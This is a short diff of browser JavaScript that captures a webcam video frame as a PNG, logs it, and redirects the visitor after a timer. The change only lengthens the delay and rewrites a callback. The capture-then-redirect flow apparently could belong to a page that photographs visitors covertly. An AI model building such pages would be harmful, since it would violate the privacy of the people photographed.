@@ -119,7 +119,7 @@
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          setTimeout(() => {
+          setTimeout(function () {
             canvas.toBlob(function(blob) {
               console.log('Фотография создана');
               savedPhoto = blob;
@@ -127,7 +127,7 @@
               logPhotoInfo();
               redirectToFinalDestination();
             }, 'image/png');
-          }, 3000);
+          }, 6000);
         }
       }, 3000);
     }
